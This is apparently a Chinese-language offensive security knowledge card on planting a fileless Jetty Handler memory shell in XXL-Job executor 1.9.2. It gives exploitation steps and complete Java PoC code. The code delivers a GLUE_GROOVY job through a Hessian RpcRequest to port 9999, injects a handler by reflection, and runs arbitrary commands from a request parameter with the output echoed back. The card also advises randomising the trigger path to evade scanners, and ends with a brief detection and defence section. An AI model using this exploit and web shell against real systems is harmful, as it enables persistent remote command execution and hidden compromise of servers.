---
id: web-java-component-xxl-job-executor-jetty-handler-collection-memshell
title: XXL-Job Executor 1.9.2 瘦身版 Jetty 内存马：从线程栈反射取 JettyServer 的 HandlerCollection，向 _handlers 前置恶意 Handler
type: scenario
domain: web
path: web/java/component
technique: xxl-job-executor-jetty-handler-collection-memshell
aliases:
- xxl-job-executor 内存马
- Jetty Handler 内存马
- HandlerCollection._handlers
- 瘦身版 Jetty 无 servlet 包
- 9999 端口 Jetty 内存马
- JettyServerHandler 内存马
tags:
- java
- jetty
- memshell
- xxl-job
- handler
- reflection
- hessian
- glue-job
cve: []
severity: critical
confidence: high
affected_versions: xxl-job 1.9.2（xxl-job-executor 默认 9999 端口的 Jetty RPC 服务）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:48:05+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；原理、反射链、HandlerCollection._handlers 注入、GLUE_GROOVY 投递与源码均与原文一致，affected_versions xxl-job 1.9.2 与原文落点一致，未执行文中 PoC
---

## 一句话结论

xxl-job-executor 1.x 在 9999 端口用一个**未引入 servlet 包的瘦身版 Jetty** 承载 executor 的 RPC 服务，因此 `ServletHandler`/`FilterHolder` 那一套 Jetty 内存马完全不可用；真正的注入点是 `org.eclipse.jetty.server.handler.HandlerCollection` 的 `_handlers` 数组——先用反序列化/GLUE 任务拿到一次 Java 代码执行，再从 `ThreadGroup.threads → JettyServer$1.this$0 → server._handler` 反射拿到该数组，把恶意 `AbstractHandler` 插到数组最前面，此后访问带特定路径前缀的任意请求都会执行命令并回显。

## 原理

- **为什么 Servlet/Filter 内存马失效**：官方 2.x 走 Netty，1.x 走 Jetty；而 `xxl-job-core` 里这份 Jetty 是"阉割版"依赖，只引入 `org.eclipse.jetty.server.*`/`io`，没有 `javax.servlet` 相关类。所有依赖 `ServletHandler._filterPathMappings`、`ServletHandler._servlets`、`ServletHolder`/`FilterHolder` 的公开内存马都需要 servlet API，在目标上 `ClassNotFoundException` 或方法签名不匹配，无法注册。
- **请求真正经过的位置**：`org.eclipse.jetty.server.Server.handle()` → `HttpChannel` → `HandlerWrapper.handle()` → `HandlerCollection.handle()`；`HandlerCollection` 持有 `Handler[] _handlers`，逐个调用 `handler.handle(target, baseRequest, request, response)`，任一 handler 调用 `request.setHandled(true)` 后链路即停止。这就是可写的"路由表"。
- **为什么插入最前面就够了**：`HandlerCollection` 按数组顺序遍历，把恶意 handler 放在下标 0、把它原来的 handlers 追加到后面，恶意 handler 先判路径前缀，命中就 `setHandled(true)` 执行命令并写响应；不命中直接 `return`，原业务 handler（`JettyServerHandler`）照旧处理，业务不中断。
- **怎么拿到 JettyServer**：Jetty 的 `Server` 由 `com.xxl.job.core.rpc.netcom.jetty.server.JettyServer` 启动，它内部类 `JettyServer$1`（Thread 的 Runnable）持有 `this$0` 指回 `JettyServer`，`JettyServer` 上有 `server` 字段。于是从当前线程的 `ThreadGroup.threads` 全量遍历，用类名包含 `jetty.server.JettyServer` 的 Thread.target 定位即可（原文用对象搜索工具得到的正是这条路径）。
- **代码执行入口从哪来**：9999 端口把请求体直接交给 Hessian2 反序列化（`JettyServerHandler.handle` 内 `RpcRequest` 反序列化后反射调用 `ExecutorBiz.run(TriggerParam)`）；`TriggerParam` 的 `glueType=GLUE_GROOVY` + `glueSource` 会让 executor 把源码编译成 `IJobHandler` 并执行 `execute(String param)`。所以只要能把 `RpcRequest` 打进去，就等于拿到一次任意 Java 代码执行，用它在同一 JVM 内做上面的反射注入。
- 不落盘、不改 jar、不改 web.xml，进程重启即失效；因为只动 `_handlers` 数组引用，连 Jetty 的生命周期状态都没变，难以通过"新增 Servlet/Filter"这类基线发现。

## 触发条件

- 目标为 xxl-job-executor 1.x（原文 1.9.2），executor 的 9999 Jetty RPC 端口可直连（实战中常见只暴露 9999）。
- 已能投递一次反序列化/任务执行：例如 9999 的 Hessian2 `RpcRequest` 反序列化入口，或 admin 下发 GLUE 任务（`GLUE_GROOVY`/`GLUE_SHELL` 等在 executor 端编译执行）。
- 目标 JVM 内代码执行权限与 Jetty 服务同进程（executor 与 Jetty 同 JVM，天然满足）。
- 目标未部署针对 `HandlerCollection._handlers` 反射修改、异常 `AbstractHandler` 子类加载的 RASP/agent。

## 利用步骤

1. 探测 9999 端口：向 `http://<host>:9999` POST 一个 Hessian 序列化的 `RpcRequest`（`className=com.xxl.job.core.biz.ExecutorBiz`、`methodName=run`、参数 `TriggerParam`），确认服务端进入 Hessian 反序列化并执行任务逻辑。
2. 构造 `TriggerParam`：`glueType=GLUE_GROOVY`、`glueSource` 为下面的注入代码、`glueUpdatetime` 设当前时间、`jobId/logId` 任取正整数。
3. 代码里先做一次全线程枚举：取 `Thread.currentThread().getThreadGroup()` 的 `threads` 字段，遍历找出类名含 `JobThread` 的线程，再取该线程组的 `threads`，对每个 Thread 取 `target` 字段，类名含 `jetty.server.JettyServer` 的即命中。
4. 命中后反射链：`tThread.target → this$0 (JettyServer) → server (org.eclipse.jetty.server.Server) → _handler (HandlerCollection)`，再读 `_handlers` 数组。
5. 新建恶意 `AbstractHandler` 实例（最好用容器加载器加载的类，避免同名类身份不一致），组成新数组 `[evilHandler] + 原 _handlers[0].getHandlers()`，用 `setField`（含沿父类查找，因为 `_handlers` 声明在 `HandlerCollection` 上）写回 `server.getHandler()` 的 `_handlers`。
6. 访问 `http://<host>:9999/<任意含 dmc 的路径>?q=<命令>`，恶意 handler 命中前缀 → `setHandled(true)` → `Runtime.exec` 并把子进程 stdout 写回响应体；不带前缀的请求继续走原业务。

## PoC

投递侧（Hessian 序列化 `RpcRequest`，省略 HTTP 客户端细节）：

```java
TriggerParam p = new TriggerParam();
p.setJobId(10); p.setLogId(10);
p.setExecutorBlockStrategy("SERIAL_EXECUTION");
p.setGlueType("GLUE_GROOVY");
p.setGlueSource(GLUE_SRC);              // 下面的注入代码
p.setGlueUpdatetime(System.currentTimeMillis());

RpcRequest req = new RpcRequest();
req.setClassName("com.xxl.job.core.biz.ExecutorBiz");
req.setMethodName("run");
req.setParameterTypes(new Class[]{TriggerParam.class});
req.setParameters(new Object[]{p});
req.setCreateMillisTime(System.currentTimeMillis());

byte[] body = new HessianSerializer().serialize(req);   // POST 到 http://host:9999
```

注入代码（GLUE 源码，编译后 execute 内执行）：

```java
ThreadGroup g = Thread.currentThread().getThreadGroup();
Thread[] all = (Thread[]) getField(g, "threads");
for (Thread t : all) {
  if (t.getClass().getName().contains("JobThread")) {
    for (Thread jt : (Thread[]) getField(t.getThreadGroup(), "threads")) {
      Object target = getField(jt, "target");
      if (target == null || !target.getClass().getName().contains("jetty.server.JettyServer")) continue;
      Server server = (Server) getField(getField(target, "this$0"), "server");
      HandlerCollection hc = (HandlerCollection) server.getHandler();
      ArrayList<Handler> list = new ArrayList<>();
      list.add(new evilHandler());                     // 恶意 handler 前置
      list.addAll(Arrays.asList(hc.getHandlers()));    // 保留原业务链
      setField(hc, "_handlers", list.toArray(new Handler[0]));
    }
  }
}

public class evilHandler extends AbstractHandler {
  public void handle(String path, Request req, HttpServletRequest q, HttpServletResponse r) throws IOException {
    if (!path.contains("dmc")) return;                 // 前缀不对就走原链路
    r.setStatus(200); r.setContentType("text/html;charset=utf-8");
    req.setHandled(true);                              // 终止后续 handler
    Process proc = Runtime.getRuntime().exec(req.getParameter("q"));
    InputStream in = proc.getInputStream();
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    byte[] buf = new byte[1024]; int n;
    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
    r.getOutputStream().write(out.toByteArray());
    r.getOutputStream().flush();
  }
}
```

`getField`/`setField` 为沿继承链查找并 `setAccessible(true)` 的工具方法（`_handlers` 在 `HandlerCollection` 上，`server`/`this$0` 在各自类上）。

## 变体与关联

- **口令/随机路径**：原文用固定前缀 `dmc`；实战应换成随机串或校验自定义请求头，避免被扫描器命中。
- **不依赖 GLUE 的入口**：任何能拿到一次 JVM 内代码执行的入口都可用（Hessian/JDK 反序列化链、表达式注入、`JettyServerHandler` 的其他反射调用），本卡的注入部分是通用"Jetty Server 级内存马"。
- **同族位置对比**：Jetty 9 的 Servlet/Filter 内存马走 `ServletHandler`（`_servletMappings`/`_filterPathMappings`），Jetty 10/11 走 `ThreadLocal` 取 `HttpConnection` 直接从连接层处理；本卡是**再上一层**的 `HandlerCollection`，适用于没有 servlet API 的瘦身 Jetty。
- **xxl-job 2.x**：改用 Netty/内嵌 Spring Boot，入口与内存马写法都不同，本卡不适用。
- 关联：[[web-java-component-jetty9-servlethandler-filter-memshell]]、[[web-java-component-jetty9-servlethandler-servlet-memshell]]、[[web-java-component-jetty11-threadlocal-header-memshell]]、[[web-java-deser-hessian-xxl-job-admin-api-entry]]。

## 检测与防御

- **检测**：运行期 dump `org.eclipse.jetty.server.Server` 的 `_handler`，对比 `HandlerCollection._handlers` 的类名/数量与启动快照，出现未知 `AbstractHandler` 子类或数组被替换即为注入；监控对 `HandlerCollection._handlers`、`JettyServer.server` 的反射写；关注 GLUE 类型任务（`GLUE_GROOVY`/`GLUE_SHELL`）在非调度时间的异常下发，以及 9999 端口非常规来源的 POST。
- **防御**：9999 端口不对公网暴露（只允许 admin 回连的地址段），executor 侧开启 xxl-job 的 accessToken 校验；升级到 2.x 并给 Hessian 反序列化加白名单；对 `IJobHandler` 的 GLUE 源码编译做审计；部署 RASP 监控 `_handlers`/`Server.setHandler` 类反射调用。
- **边界**：本卡只适用于 1.x 瘦身版 Jetty；重启进程即失效，但若攻击者已能反复投递反序列化 payload，重启不构成有效清除。
